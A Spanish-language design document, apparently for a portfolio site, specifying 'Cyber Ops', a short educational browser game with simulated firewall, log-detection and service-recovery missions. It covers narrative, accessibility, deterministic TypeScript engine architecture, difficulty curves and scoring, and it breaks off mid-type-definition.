# 09 · Cyber Ops

**Estado:** borrador para revisión. No se implementa nada hasta que César lo apruebe.
**Fecha:** 2026-10-05.
**Depende de:** 00 (contrato de autenticidad), 02 (rutas y navegación), 03 (sistema visual),
04 (arquitectura técnica), 05 (i18n y modelo de contenido), 08 (Security Lab), 11 (calidad).
**Origina:** tres ADRs (ver §20).

## Resumen

Cyber Ops es un juego corto de tres misiones que funciona como puente narrativo hacia el trabajo
real de César. Cada misión enseña un modo de falla distinto: una entrada que no se valida
(Firewall), una intrusión que hay que encontrar en los logs (Detección) y un servicio que cae por
un cambio razonable (Recuperación). Al final, el juego manda al Security Lab y a los casos de
estudio, donde está lo que sí existe.

Decisiones principales:

- Motor en TypeScript puro, sin DOM ni React, determinista con semilla. React solo dibuja.
- DOM (HTML + SVG), no Canvas: el juego consiste en leer texto (payloads, logs, métricas).
- Solo la Misión 01 corre en tiempo real, y tiene un modo sin límite de tiempo con el mismo contenido.
  Las Misiones 02 y 03 son por turnos; su "tiempo" es simulado y no depende del reloj.
- Todo dato del juego es SIMULADO y se etiqueta en pantalla. No hay integración con Wazuh ni con
  ningún servicio.
- Progreso y mejores puntajes solo en `localStorage`. Sin backend, sin leaderboard.
- Ninguna misión está bloqueada: se recomienda un orden, pero un CTO puede ir directo a la 03.

---

## 1. Propósito y tesis

### 1.1 Qué es y qué no es

| Es | No es |
|---|---|
| Una forma interactiva de mostrar criterio sobre cómo fallan los sistemas | Decoración ni un "easter egg" |
| Un puente hacia el Security Lab y los casos de estudio | Una demo de integración con Wazuh, un SIEM o un WAF |
| Una pieza de ingeniería en sí misma (motor puro, tests deterministas, accesible) | Un juego de reflejos con estética "hacker" |
| Corto: tres misiones que se juegan por separado | Un sistema de puntos, logros o rankings |

La tesis del juego es la frase de cierre (§3.5): **la ingeniería no es solo construir sistemas; es
entender cómo fallan.** Cada misión muestra una forma distinta de fallar, y la misma forma de pensar
que se puede verificar en el trabajo real de César.

### 1.2 Arco narrativo

Un único sistema ficticio (una API de reservas e inventario, sin nombre de marca) atraviesa las
tres misiones. La continuidad hace que el juego se lea como una historia y no como tres minijuegos
sueltos.

| Misión | Momento | Modo de falla | Función (lenguaje común en seguridad y SRE) |
|---|---|---|---|
| 01 Firewall | De noche, el tráfico HTTP llega al gateway | Confiar en la entrada | Prevenir |
| 02 Detección | Esa misma noche, un ataque que no entra por HTTP | Una alerta no es un incidente, y un incidente puede no tener alerta | Detectar y responder |
| 03 Recuperación | Al día siguiente, un deploy rompe el servicio. No hay atacante | La complejidad crea modos de falla | Recuperar |

Transiciones (bilingües, se muestran en el debrief de cada misión como enlace a la siguiente):

| De → a | ES | EN |
|---|---|---|
| 01 → 02 | El firewall filtra lo que entra por HTTP. No todo entra por ahí. | The firewall filters what comes in over HTTP. Not everything does. |
| 02 → 03 | No todos los incidentes tienen un atacante. A veces basta un cambio razonable. | Not every incident has an attacker. Sometimes a reasonable change is enough. |

### 1.3 Qué demuestra cada misión y para quién

Audiencias definidas en la guía de contenido: recruiter de software, empresa de ciberseguridad, CTO.

| Misión | Conocimiento que demuestra | Recruiter de software | Empresa de ciberseguridad | CTO |
|---|---|---|---|---|
| 01 Firewall | Clases de inyección (SQLi, XSS, path traversal, command injection, SSTI, SSRF, NoSQLi, prototype pollution, JWT `alg: none`, Log4Shell), codificación para evadir filtros, falsos positivos, y la idea central: el filtro en el borde compra tiempo, la corrección está en el código | Reconoce temas OWASP y que el juego está bien hecho | Exactitud de los payloads y de cada corrección | El costo del falso positivo (bloquear de más también tumba el servicio) y "la corrección vive en el código" |
| 02 Detección | Evento vs. alerta vs. incidente; triage; pivotar por campos (origen, cuenta, host); IOCs; eventos de autenticación de Windows; fuerza bruta vs. password spraying vs. ataque lento; severidad distinta del nivel de la regla; respuesta proporcional; ajuste de reglas (falsos positivos vs. falsos negativos) | Ve un perfil que va más allá del CRUD | Razonamiento de analista SOC y de detection engineering, con el método de investigación de su laboratorio (el lab no incluye fuerza bruta) | Trade-offs de detección y fatiga de alertas |
| 03 Recuperación | Síntoma vs. causa; mitigar antes de diagnosticar a fondo; correlacionar con cambios (deploys); fallas en cascada (caché → base de datos); acciones contraproducentes (escalar la capa equivocada, reiniciar por reflejo, vaciar la caché); circuit breaker y degradación; postmortem sin culpables | Backend con criterio operativo | Respuesta a incidentes como disciplina | Es la misión pensada para él: operación, prioridades e impacto |
| El juego como pieza | Motor puro y determinista, tests, accesibilidad, presupuesto de rendimiento | Calidad de frontend | — | Criterio de arquitectura (enlazado desde la página de arquitectura del sitio) |

### 1.4 Contrato de autenticidad aplicado al juego

Clasificación del juego según los tres ejes de 00:

| Eje | Valor | Consecuencia |
|---|---|---|
| Existencia | **REAL** (el juego es código que César construyó) | Puede aparecer en Home y en la página de arquitectura |
| Datos | **SIMULADO** (todo: peticiones, logs, métricas, sistemas, niveles de regla) | Etiqueta visible en cada pantalla de misión; nunca un número sin "simulado" cerca |
| Confidencialidad | **PÚBLICO** | Sin nombres de clientes, IPs reales, rutas internas ni datos de Brandex |

Reglas concretas:

1. **Etiqueta permanente.** El encabezado de cada misión muestra el texto "Datos simulados" /
   "Simulated data" (texto, no solo un icono), que enlaza a la explicación del hub (§3.3).
2. **Sin integración aparente.** Ningún texto dice ni insinúa que el juego lee Wazuh, un SIEM o
   tráfico real. La UI de la Misión 02 no usa la marca Wazuh. El vocabulario (evento, alerta,
   incidente, nivel de regla) es genérico de SOC, y el texto puente explica la relación (§7.1).
3. **Nada de lo que el laboratorio no hizo se atribuye al laboratorio.** El laboratorio no simuló
   fuerza bruta (está en su roadmap). El juego lo dice de forma explícita.
4. **Direcciones y dominios reservados.** IPs solo de los rangos de documentación (RFC 5737:
   `192.0.2.0/24`, `198.51.100.0/24`, `203.0.113.0/24`) o privados (RFC 1918, `10.0.0.0/8`) para la
   red interna ficticia. Dominios solo `.example`, `.test` o `.invalid` (RFC 2606). Un test lo
   verifica (§15.4).
5. **Datos reales de seguridad verificados.** IDs de eventos de Windows, técnicas de MITRE ATT&CK y
   correcciones de OWASP se verifican contra la fuente al escribir el contenido, y la fuente queda
   en el campo `ref` del contenido (no se muestra al jugador salvo como "Más información").
6. **Duraciones.** El hub no dice "10 minutos" hasta que haya playtests: ese número sería inventado.
   Después puede mostrarse como MEDIDO ("media de 6 playtests, 2026-xx").

La entrada de contenido del juego en el modelo de 05 lleva `existence: 'real'`,
`data: 'simulated'`, `confidentiality: 'public'` (los nombres exactos de los campos los fija 05).

---

## 2. Decisiones clave

| # | Decisión | Alternativas | Por qué | Costo |
|---|---|---|---|---|
| G1 | Motor puro en TS + vista React | Lógica dentro de componentes; librería de juegos | Tests deterministas sin DOM; el motor no sabe de idioma ni de layout | Una capa más (store/adaptador) |
| G2 | DOM + SVG | Canvas 2D; WebGL | Leer payloads y logs es la mecánica; el DOM da accesibilidad, selección de texto, zoom, traducción de UI y fuentes del sitio sin trabajo extra | Menos margen para cientos de sprites, que no se necesitan (≤ 10 elementos móviles) |
| G3 | Tiempo real solo en M01; M02 y M03 por turnos | Las tres en tiempo real | Investigar y diagnosticar son tareas de lectura; el reloj real las convierte en juegos de reflejos y choca con WCAG 2.2.1 | M02 y M03 se sienten menos "arcade" (es lo buscado) |
| G4 | Modo "sin límite de tiempo" en M01 | Solo tiempo real; solo ajustar velocidad | Equivalente accesible (lectores de pantalla, motricidad, reduced motion) y modo cómodo en móvil | Dos modos que probar; mejores puntajes separados |
| G5 | RNG con semilla (mulberry32) guardado en el estado | `Math.random` | Partidas repetibles: tests, Playwright, reproducir un bug con `?seed=` | Ninguno relevante |
| G6 | Paso fijo de simulación (1000/60 ms) en M01 | `dt` variable con tope de 50 ms (prototipo) | La misma semilla produce la misma secuencia de aparición a 30, 60 o 144 Hz | Un acumulador de tiempo en el bucle |
| G7 | Posiciones fuera de React (escritura directa de `--x`) | Re-render de React en cada frame | React solo renderiza cambios estructurales; el live region y el HUD no se re-renderizan 60 veces por segundo | Un registro de refs por paquete |
| G8 | Progreso solo en `localStorage` | Backend; sin persistencia | V1 no tiene backend (00); guardar el mejor puntaje es útil y no contiene datos personales | El progreso es por dispositivo |
| G9 | Sin bloqueo de misiones | Desbloqueo en orden | Un visitante con poco tiempo debe poder ir directo a la misión que le interesa | Algunos jugarán fuera de orden; las transiciones lo toleran |
| G10 | Contenido del juego tipado, con ES y EN lado a lado (`L10n`) | Diccionarios separados por idioma | El compilador impide un texto sin traducir; el contenido narrativo se traduce por bloque | Archivos de contenido más largos |
| G11 | API y logs del sistema ficticio en inglés | Rutas en español (catálogo actual) | El payload es código: no se traduce ni se duplica (regla de 00). El inglés es la convención en código y es el idioma real de los logs de Windows | Cambiar el catálogo actual (§6.11). Pregunta abierta Q2 |
| G12 | Sin sonido en V1 | Efectos de sonido | Autoplay, accesibilidad y alcance; no aporta a la tesis | Menos "feedback" sensorial |

---

## 3. Estructura y flujo global

### 3.1 Rutas

Los slugs y el prefijo de idioma los fija 02. Aquí se usan ids de ruta estables.

| Id de ruta | Slug propuesto | Contenido | Prerender |
|---|---|---|---|
| `cyberOps.hub` | `/cyber-ops` | Introducción, lista de misiones, progreso, modo preferido | Sí (estático) |
| `cyberOps.mission` | `/cyber-ops/firewall`, `/cyber-ops/detection`, `/cyber-ops/recovery` | Briefing → partida → debrief | Solo el briefing; la partida es cliente |
| `cyberOps.ending` | `/cyber-ops/ending` | Cierre y CTA | Sí, en su versión genérica |

Los ids de misión (`firewall`, `detection`, `recovery`) son estables e independientes del idioma.
Parámetros: `?seed=<hex de hasta 8 caracteres>` fija la semilla (útil para tests y para reproducir
una partida). Es inofensivo, así que se admite en producción.

### 3.2 Máquina de estados del shell

```text
hub ──Jugar──▶ briefing(m) ──Iniciar──▶ playing(m) ──fin──▶ debrief(m)
 ▲                 │                        │                  │
 │                 └──Volver───────────────►┤◄──Salir──────────┤
 │                                          ▼                  ├──Siguiente misión──▶ briefing(m+1)
 └──────────────────────────────────────── hub ◄──────────────┤
                                                               └──(m = recovery)──▶ ending ──▶ hub
```

- Salir de una partida la descarta sin confirmación: las partidas son cortas y no hay nada que perder.
- Cambiar de idioma con un prefijo de ruta desmonta la misión y reinicia la partida. Es aceptable
  (el progreso guardado no se pierde) y se documenta como limitación conocida.
- El cierre se muestra siempre después del debrief de la Misión 03, con cualquier resultado. Desde
  el hub se puede volver a abrir cuando ya se jugó la 03.

### 3.3 Hub

Lista con separadores, no rejilla de tarjetas (regla anti-cliché de 03).

```text
┌───────────────────────────────────────────────────────────────────────────┐
│ Cyber Ops                                                                 │
│ Tres misiones cortas sobre cómo fallan los sistemas: filtrar peticiones,  │
│ encontrar un ataque en los logs y recuperar un servicio.                  │
│ Datos simulados. ¿Qué significa?                                          │
│───────────────────────────────────────────────────────────────────────────│
│ Misión 01  Firewall                                       Completada      │
│ Filtra peticiones HTTP antes de que lleguen al servidor.  Mejor: 640      │
│ [ Jugar ]                                                                 │
│───────────────────────────────────────────────────────────────────────────│
│ Misión 02  Detección                                      Sin jugar       │
│ Encuentra un ataque en los logs y decide qué hacer.                       │
│ [ Jugar ]                                                                 │
│───────────────────────────────────────────────────────────────────────────│
│ Misión 03  Recuperación                                   Sin jugar       │
│ Diagnostica un servicio que falla y recupéralo.                           │
│ [ Jugar ]                                                                 │
│───────────────────────────────────────────────────────────────────────────│
│ Firewall en tiempo real o sin límite de tiempo:                           │
│ (•) Tiempo real   ( ) Sin límite de tiempo                                │
│───────────────────────────────────────────────────────────────────────────│
│ Lo real: Security Lab   Casos de estudio   Cómo está hecho este juego     │
│ Borrar progreso                                                           │
└───────────────────────────────────────────────────────────────────────────┘
```

- Si no se jugó ninguna misión, la 01 lleva el botón principal (`.button--accent`) y las demás el
  secundario. No hay candados.
- La preferencia de modo se inicializa en "Sin límite de tiempo" cuando
  `prefers-reduced-motion: reduce`; el jugador puede cambiarla.
- "¿Qué significa?" abre un `<details>` con este texto:
  - ES: "Todo lo que ves en Cyber Ops es simulado: peticiones, logs, métricas y sistemas. No hay
    conexión con Wazuh, con un SIEM ni con ningún servicio real. Los conceptos sí son reales, y cada
    misión termina con un enlace a trabajo que sí construí."
  - EN: "Everything in Cyber Ops is simulated: requests, logs, metrics and systems. Nothing here is
    connected to Wazuh, a SIEM or any real service. The concepts are real, and each mission ends with
    a link to work I actually built."
- "Borrar progreso" es un botón de dos pasos en línea ("¿Seguro? Borrar" / "Cancelar"), sin `confirm()`.

### 3.4 Briefing y debrief comunes

Briefing (antes de jugar): título, 2–3 frases de contexto, controles (con `<kbd>`), selector de modo
(solo M01), etiqueta de datos simulados y botón "Iniciar". No hay cuenta regresiva: los primeros
paquetes tardan 9 s en llegar.

Debrief (al terminar), con la misma estructura en las tres misiones:

1. Resultado: puntaje, mejor puntaje, estado (completada o no) y estadísticas de la partida.
2. Lo que pasó: explicación específica de la misión (§6.12, §7.8, §8.7).
3. La idea: una frase de tesis.
4. Lo real: 1–2 enlaces de salida al portafolio (§10.2), con una nota que distingue simulado de real.
5. Navegación: "Siguiente misión" (o "Ver el cierre"), "Jugar de nuevo", "Volver a Cyber Ops".

### 3.5 Cierre

Cada frase se usa donde más significa:

- "Los sistemas no fallan porque a sus ingenieros no les importe. Fallan porque la complejidad crea
  modos de falla." / "Systems don't fail because engineers don't care. They fail because complexity
  creates failure modes." → **cierra el postmortem de la Misión 03**, en un contexto sin culpables.
- "La ingeniería no es solo construir sistemas. Es entender cómo fallan." / "Engineering isn't only
  about building systems. It's about understanding how they fail." → **titular del cierre del juego**.

```text
┌─────────────────────────────────────────────────────────────────┐
│                                                                 │
│  La ingeniería no es solo construir sistemas.                   │
│  Es entender cómo fallan.                                       │
│                                                                 │
│  En esta partida:                                               │
│  Bloqueaste 23 de 26 amenazas y dejaste pasar 2 peticiones      │
│  legítimas que parecían ataques.                                │
│  Encontraste el inicio de sesión que confirmó la intrusión.     │
│  Recuperaste el servicio en 11 minutos simulados.               │
│                                                                 │
│  Todo esto fue simulado. El Security Lab no lo es.              │
│                                                                 │
│  [ Ver el Security Lab ]   Ver casos de estudio                 │
│  Volver a Cyber Ops                                             │
└─────────────────────────────────────────────────────────────────┘
```

- El resumen usa solo resultados de la partida actual (en memoria). Las líneas de misiones no
  jugadas en esta sesión se omiten; si no hay ninguna, el resumen desaparece y queda el titular.
- Texto puente: ES "Todo esto fue simulado. El Security Lab no lo es." / EN "All of this was
  simulated. The Security Lab isn't."
- CTA principal: "Ver el Security Lab" / "See the Security Lab" → `/security`. Secundario: casos de
  estudio. Terciario: volver al hub.
- Página tipográfica, sin animación de entrada. Se marca `endingSeen = true` al mostrarse.

---

## 4. Arquitectura técnica

### 4.1 Capas

```text
┌────────────────────────── src/game/ ───────────────────────────┐
│ content/   Datos tipados y textos L10n. Sin lógica de juego.   │
│    │ (lo importa)                                              │
│    ▼                                                           │
│ engine/    TS puro: init, reduce, funciones derivadas.         │
│            No importa React, DOM, window ni textos.            │
│    │ (lo usa)                                                  │
│    ▼                                                           │
│ view/      React + CSS. Traduce ids a textos, dibuja,          │
│            convierte input en acciones.                        │
│    │                                                           │
│    ▼                                                           │
│ platform/  Adaptadores: bucle rAF, almacenamiento, visibilidad,│
│            semilla, locale del sitio, rutas del portafolio.    │
└────────────────────────────────────────────────────────────────┘
```

Reglas de dependencia (las verifica ESLint con `no-restricted-imports`, ver §15.5):

- `engine/` no importa nada de `view/`, `platform/`, `react`, ni APIs del navegador.
- `content/` solo importa tipos del motor y `core/types`.
- Nada fuera de `src/game/` importa de `src/game/`, salvo el módulo de ruta (import dinámico) y
  `src/game/entry.ts` (metadatos para el bloque de Home, sin código de juego).

### 4.2 Contrato del motor

Cada misión expone un motor con la misma forma: un reducer puro que devuelve el nuevo estado y los
eventos que produjo.

```ts
// core/types.ts
export type Locale = 'es' | 'en'
export type L10n = Readonly<Record<Locale, string>>
export type MissionId = 'firewall' | 'detection' | 'recovery'
export type Mode = 'realtime' | 'untimed'

export interface Step<S, E> {
  readonly state: S
  readonly events: readonly E[]
}

export interface Engine<S, A, E, C> {
  init(config: C, seed: number): S
  reduce(state: S, action: A): Step<S, E>
}
```

Propiedades exigidas:

- **Puro y determinista.** `reduce` no lee reloj, `Math.random` ni globals. El tiempo entra como
  acción (`{ type: 'tick', dt }` en M01; costo en minutos simulados en M03). El RNG vive en el
  estado como un `uint32`.
- **Inmutable.** Devuelve objetos nuevos. A esta escala (≤ 10 entidades por tick) el costo de
  asignar memoria es despreciable. Si el perfilado lo contradice (§14), se cambia dentro del motor
  sin tocar la interfaz.
- **Sin textos.** El motor emite ids y códigos (`payloadId`, `reason: 'breach'`). La vista los
  traduce. Cambiar de idioma no afecta el estado.
- **Invariantes en desarrollo.** `assertInvariants(state)` corre en tests y en `import.meta.env.DEV`
  (por ejemplo, integridad ≥ 0, sin paquetes resueltos en la lista de vuelo).

RNG (mulberry32, dominio público):

```ts
// core/rng.ts
export function rngNext(s: number): readonly [value: number, next: number] {
  const next = (s + 0x6d2b79f5) | 0
  let t = Math.imul(next ^ (next >>> 15), 1 | next)
  t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t
  return [((t ^ (t >>> 14)) >>> 0) / 4294967296, next]
}
```

Semilla: `?seed=` si existe y es válida; si no, `crypto.getRandomValues(new Uint32Array(1))[0]`. El
debrief muestra la semilla en el pie, en pequeño ("Partida 3F2A9C"), con un enlace para repetirla.

### 4.3 DOM y SVG, no Canvas

| Criterio | DOM + SVG | Canvas |
|---|---|---|
| Leer texto (la mecánica) | Tipografía del sitio, nitidez, zoom del navegador, selección | Texto rasterizado; zoom y nitidez a mano |
| Accesibilidad | Botones, tablas, formularios y live regions nativos | Hay que construir un árbol accesible paralelo |
| Tema claro/oscuro | Tokens CSS sin más | Leer tokens y redibujar |
| Rendimiento necesario | ≤ 10 elementos móviles con `transform`: compositor | Sobra |
| Tests | Testing Library y Playwright por rol y texto | Tests de píxeles o hooks especiales |

SVG se usa para lo que es dibujo: el rack de integridad (M01), los conectores del diagrama y la
serie temporal de errores (M03). Los nodos interactivos del diagrama son botones HTML, no `<g>`
clicables.

### 4.4 Bucle en tiempo real (solo M01)

```ts
// platform/loop.ts — paso fijo con acumulador
const STEP_MS = 1000 / 60
const MAX_STEPS_PER_FRAME = 3 // equivale a recortar dt a 50 ms

export function startLoop(store: FirewallStore): () => void {
  let last = performance.now()
  let acc = 0
  let id = requestAnimationFrame(function frame(now) {
    acc += Math.min(now - last, STEP_MS * MAX_STEPS_PER_FRAME)
    last = now
    while (acc >= STEP_MS) {
      store.dispatch({ type: 'tick', dt: STEP_MS })
      acc -= STEP_MS
    }
    store.writePositions() // escribe --x en cada paquete registrado
    if (store.getState().status === 'running') id = requestAnimationFrame(frame)
  })
  return () => cancelAnimationFrame(id)
}
```

- El bucle arranca solo con `status === 'running'` y se cancela al pausar, al terminar o al desmontar.
  Es idempotente bajo `StrictMode`: el efecto que lo arranca devuelve la función de limpieza.
- Pausa automática (acción `{ type: 'pause', reason }`): `document.visibilityState === 'hidden'`,
  tablero visible en menos del 50 % (hook `useInView` existente con `threshold: 0.5`) y `blur` de la
  ventana. **Reanudar requiere una acción explícita** del jugador ("Continuar", que recibe el foco).
- M02 y M03 no tienen bucle: cada interacción despacha una acción, el motor reduce y React renderiza.

### 4.5 Integración con React

- M02 y M03: hook `useEngine(engine, config, seed)` sobre `useReducer`, que guarda `state` y los
  `events` del último paso.
- M01: un store mínimo (`createStore`) con `subscribe`/`getState`. El estado tiene `rev`, un contador
  que solo cambia en cambios estructurales (aparece o se resuelve un paquete, cambia el puntaje, la
  oleada, la integridad o el estado). React se suscribe a `rev` con `useSyncExternalStore`; las
  posiciones las escribe `writePositions()` con `el.style.setProperty('--x', String(x))` sobre un
  `Map<packetId, HTMLElement>` que llenan los callbacks de ref de cada paquete.
- Los eventos de cada paso alimentan: el live region (con límite de frecuencia, §12.2), las clases
  de feedback visual y el resumen del debrief. **No se envían a analítica**: V1 no tiene tracking de
  eventos de juego.

### 4.6 Prerender e hidratación

Con el prerender confirmado (D4, ADR-0001, 2026-10-06), se prerenderizan el hub, los briefings y
la versión genérica del cierre (título, texto, metadatos). El progreso se lee de `localStorage` en un efecto, no durante el
render, y `getServerSnapshot` devuelve el progreso vacío: así no hay diferencias de hidratación. El
motor solo se inicializa al pulsar "Iniciar".

### 4.7 Errores

- Un `ErrorBoundary` por misión muestra "Algo falló en esta misión. Volver a Cyber Ops" sin romper
  el resto del sitio.
- Si falla la carga del módulo de una ruta del juego tras un deploy con hashes nuevos, React Router
  recarga una sola vez **la página actual**, no la de destino, y el jugador repite la navegación
  (11 §9, spike D4). Si falla un chunk diferido propio y la recarga no lo resuelve, el boundary de
  la ruta ofrece "Recargar la página".
- Las violaciones de invariantes lanzan error solo en desarrollo; en producción se registran con
  `console.error` y el juego sigue.

---

## 5. Tipos compartidos

```ts
// core/types.ts (continuación)
export type Tier = 1 | 2 | 3 // 1 evidente, 2 moderado, 3 sutil

export interface MissionProps {
  mode: Mode
  seed: number
  onFinish(result: MissionResult): void
  onExit(): void
}

export interface MissionResult {
  mission: MissionId
  mode: Mode            // M02 y M03 siempre 'untimed'
  score: number
  completed: boolean
  summary: MissionSummary
}

export type MissionSummary =
  | {
      mission: 'firewall'
      outcome: 'survived' | 'breached' | 'finished'
      threatsBlocked: number
      threatsTotal: number
      legitDelivered: number
      legitTotal: number
      falsePositives: number
      breaches: number
      waveReached: number // 0 en modo sin tiempo
    }
  | {
      mission: 'detection'
      cases: ReadonlyArray<{ caseId: DetectionCaseId; score: number; max: number }>
      keyEventFound: boolean
      rule?: RuleConfig
    }
  | {
      mission: 'recovery'
      outcome: 'recovered' | 'timeout'
      minutes: number
      failedRequests: number
      degradedRequests: number
      diagnosisCorrect: boolean
    }

// Enlaces de salida: ids de ruta del portafolio, no strings de URL.
export type PortfolioRouteId = string // tipo real lo exporta el registro de rutas de 02/04
export interface ExitLink {
  route: PortfolioRouteId
  hash?: string
  label: L10n
  note: L10n // "En el juego, simulado. Aquí, lo que construí."
}
```

---

## 6. Misión 01 · Firewall

### 6.1 Evaluación del prototipo

| Elemento del prototipo | Veredicto | Cambio y motivo |
|---|---|---|
| 3 carriles, paquetes de izquierda a derecha, clic para bloquear, teclas 1/2/3, P | Se mantiene | Funciona y se entiende en segundos |
| Velocidad en anchos de pista por segundo | **Cambia** | Con anchos por segundo, el tiempo de lectura es igual en todas las pantallas, pero un chip de 40 caracteres ocupa casi toda la pista en móvil. Se define **tiempo de viaje en ms** por oleada y se adapta el número de carriles al ancho (§6.5, §13) |
| 8 niveles de 20 s, sin final | **Cambia** | 6 oleadas de 20 s con final ("sobreviviste"). La partida dura unos 2 minutos, deja tiempo para las otras dos misiones y tiene un final que conecta con la siguiente |
| Integridad 3 | **Cambia a 5** (ajustable) | Con unas 100 decisiones por partida, 3 errores exigen un 97 % de acierto: la mayoría de visitantes no llegaría a ver el contenido sutil. Criterio de playtest en §6.14 |
| Velocidad + aparición + proporción de amenazas | Se mantiene, se amplía | Se agrega **dificultad de contenido** (tiers): las peticiones sutiles aparecen desde la oleada 3 |
| `dt` limitado a 50 ms | **Cambia** | Paso fijo (G6) para que la misma semilla produzca la misma partida |
| Pausa automática fuera de vista o con la pestaña oculta | Se mantiene | Se agrega `blur` y reanudar exige una acción explícita |
| Debrief con tipos de ataque y prevención | Se mantiene, se amplía | Fragmento peligroso marcado, explicación de los legítimos engañosos y la tesis "la corrección vive en el código" |
| Payloads legítimos engañosos (O'Higgins, "script de ventas") | Se mantiene | Son lo mejor del diseño: enseñan que bloquear de más también rompe el servicio. Se agregan más (§6.11) |
| Solo clic o tecla de carril | **Se amplía** | **Inspector**: un panel fijo bajo el tablero muestra en grande el paquete más urgente (o el primero del carril seleccionado) con un botón "Bloquear". Permite leer sin perseguir texto en movimiento, es cómodo en móvil y funciona con zoom |

Nota de precisión para la audiencia de seguridad: lo que hace el jugador es más propio de un WAF que
de un firewall de red. El nombre "Firewall" se mantiene porque lo entiende cualquiera; el debrief
lo aclara en una línea.

### 6.2 Objetivo

- Narrativa: eres el filtro del gateway. Deja pasar lo legítimo y bloquea lo que intenta que el
  servidor ejecute datos como código.
- Concepto: HTTP → petición → payload → filtrado.
- Mensaje del debrief: el filtro compra tiempo; la corrección vive en el código (consultas
  parametrizadas, escape de salida, listas de valores permitidos, validación de esquema).

### 6.3 Modos

| | Tiempo real | Sin límite de tiempo |
|---|---|---|
| Presentación | Carriles con paquetes en movimiento | Una petición a la vez, en tarjeta grande |
| Decisión | Bloquear (dejar pasar es lo que ocurre si no haces nada) | "Permitir" o "Bloquear", explícito |
| Duración | 6 oleadas × 20 s | 24 peticiones |
| Fin | Sobrevives a la oleada 6 o la integridad llega a 0 | Al decidir las 24 |
| Feedback | Marcador breve en el paquete y el HUD | Panel con explicación después de cada decisión |
| Mejor puntaje | `best.realtime` | `best.untimed` |
| Por defecto | Si no hay `prefers-reduced-motion` | Si hay `prefers-reduced-motion: reduce` |

Texto del selector en el briefing: ES "Si usas lector de pantalla o prefieres leer con calma, elige
Sin límite de tiempo: es el mismo contenido." / EN "If you use a screen reader or prefer to read at
your own pace, choose No time limit: same content."

### 6.4 Game loop (tiempo real)

```text
tick(dt):
  si status != running → sin cambios
  elapsed += dt
  wave = min(6, floor(elapsed / 20000) + 1)          → evento waveStarted si cambió
  para cada paquete en vuelo: x += dt / travelMs(wave)   (velocidad global: nadie adelanta a nadie)
  para cada paquete con x >= 1 (llegó al gateway):
      amenaza  → breach:    integrity -= 1
      legítimo → delivered: score += 2 (tier 1) o 6 (tier ≥ 2)
  si integrity == 0 → status = ended, outcome = breached
  si elapsed < 6 × 20000 y elapsed >= nextSpawnAt:
      elegir amenaza o legítimo (threatRatio)
        amenaza  → elegir tier según la mezcla de la oleada
        legítimo → engañoso con probabilidad trickyLegit(wave), si no simple
      sacar de la bolsa barajada correspondiente
      elegir carril libre (azar entre los libres)
      si no hay carril libre → nextSpawnAt = elapsed + 100 (reintento)
      si no → crear paquete en x = 0; nextSpawnAt = elapsed + spawnMs(wave) · jitter · factorCarriles
  si elapsed >= 6 × 20000 y no quedan paquetes en vuelo → status = ended, outcome = survived

block(packetId) / blockLane(lane) / blockInspected:
  si status != running o el paquete ya se resolvió → ignorar
  amenaza  → score += 10 × wave; evento blocked{correct: true}
  legítimo → falso positivo: integrity -= 1; evento blocked{correct: false}
```

- **Carril libre**: está vacío o su último paquete cumple `x − w ≥ 0.04`, donde `w` es el ancho
  estimado del chip como fracción de la pista: `w = min(maxFrac, len × charFrac + padFrac)`. La vista
  mide `charFrac`, `padFrac` y `maxFrac` al iniciar y en cada `resize` (acción `{ type: 'measure' }`).
  Los solapamientos de paquetes que ya estaban en pista durante un cambio de tamaño se toleran.
- **Paquete más adelantado de un carril**: el de mayor `x` entre los que siguen en vuelo.
- **Inspector**: muestra el paquete con mayor `x` de todo el tablero o, si hay carril seleccionado,
  el más adelantado de ese carril.
- **Bolsa barajada**: hay cinco bolsas (`threat:1`, `threat:2`, `threat:3`, `legit:simple`,
  `legit:tricky`). Cada una se baraja con el RNG y se vacía antes de repetir. Evita repeticiones
  cercanas y sigue siendo determinista. Los legítimos engañosos son escasos a propósito: aparecen
  como excepción, no como regla.

Modo sin límite de tiempo: `init` genera las 24 peticiones de una vez (posiciones 1–8 con la mezcla
de tiers de la oleada 1, 9–16 con la de la oleada 3 y 17–24 con la de la oleada 5; proporción de
amenazas 0.45). `decide(index, verdict)` puntúa y emite `decided`. No hay `tick`.

### 6.5 Curva de dificultad (tiempo real)

| Oleada | t (s) | `travelMs` | `spawnMs` base | Amenazas | Tiers de amenazas | Legítimos engañosos |
|---|---|---|---|---|---|---|
| 1 | 0–20 | 9000 | 1600 | 0.38 | 1: 100 % | 0 |
| 2 | 20–40 | 8200 | 1420 | 0.41 | 1: 100 % | 0 |
| 3 | 40–60 | 7400 | 1240 | 0.45 | 1: 40 %, 2: 60 % | 0.15 |
| 4 | 60–80 | 6600 | 1060 | 0.48 | 1: 40 %, 2: 60 % | 0.15 |
| 5 | 80–100 | 5800 | 880 | 0.52 | 1: 20 %, 2: 40 %, 3: 40 % | 0.25 |
| 6 | 100–120 | 5000 | 700 | 0.55 | 1: 20 %, 2: 40 %, 3: 40 % | 0.25 |

- Fórmulas: `travelMs = 9000 − 800·(w−1)`; `spawnMs = max(700, 1600 − 180·(w−1))`;
  `threatRatio = min(0.55, 0.38 + 0.035·(w−1))`; jitter uniforme ±25 %. "Legítimos engañosos" es
  la probabilidad de que un legítimo salga de la bolsa `legit:tricky` (tier 2 o 3).
- Con 2 carriles (contenedor < 560 px): `spawnMs × 1.5`, para que cada carril tenga la misma densidad.
- Decisiones por segundo: de ~0.6 en la oleada 1 a ~1.4 en la 6. La sobrecarga final es intencional:
  sostiene la frase del debrief "en las últimas oleadas ya no hay tiempo de leer cada petición".
- Todos los valores viven en `missions/firewall/params.ts` como tabla de datos, no como constantes
  repartidas por el motor.

### 6.6 Puntaje

| Resultado | Tiempo real | Sin límite de tiempo |
|---|---|---|
| Amenaza bloqueada | +10 × oleada | +10 × tier |
| Legítimo entregado | +2 (tier 1), +6 (tier ≥ 2) | +10 × tier (permitir explícito) |
| Falso positivo (legítimo bloqueado) | 0 y −1 integridad | 0 |
| Brecha (amenaza entregada) | 0 y −1 integridad | 0 |

Estadísticas del debrief: precisión (decisiones correctas / total), amenazas bloqueadas `x/y`,
legítimos entregados `x/y`, falsos positivos, brechas y oleada alcanzada. "Completada" en tiempo real
significa sobrevivir a la oleada 6; sin límite de tiempo, terminar las 24.

### 6.7 Modelo de estado

```ts
// missions/firewall/types.ts
export type AttackKind =
  | 'sqli' | 'xss' | 'traversal' | 'cmdi' | 'ssti'
